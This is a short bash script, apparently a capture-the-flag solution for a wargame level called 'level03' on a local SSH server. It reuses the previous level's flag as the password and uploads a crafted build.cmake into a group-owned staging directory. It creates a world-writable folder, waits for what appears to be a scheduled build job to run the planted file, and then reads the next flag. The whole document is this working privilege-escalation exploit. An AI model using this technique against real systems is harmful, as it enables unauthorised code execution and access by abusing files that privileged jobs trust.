#! /bin/bash

if ! command -v sshpass
then
    echo -e "Install sshpass command before executing this shell script."
else
    USER="level03"
    ADDRESS="localhost"
    PORT="4242"
    export SSHPASS=$(cat ../../level02/flag)
    echo -e "\nExploiting level03 ssh server ...\n\n\n"
    DEST=$(sshpass -e ssh -p "$PORT" "$USER"@"$ADDRESS" "find / -group burbclave  2> /dev/null | grep staging")
    echo -e "got dest var $DEST"
    cat build.cmake | sshpass -e ssh -p "$PORT" "$USER"@"$ADDRESS" "cat > '$DEST'/build.cmake && mkdir -p '$DEST/copy' && chmod 777 '$DEST'/copy"
    echo -e "created build.cmake"
    sleep 61
    echo -e "\nGot a flag:"
    sshpass -e ssh -p "$PORT" "$USER"@"$ADDRESS" "cat $DEST/copy/.flag"
fi    
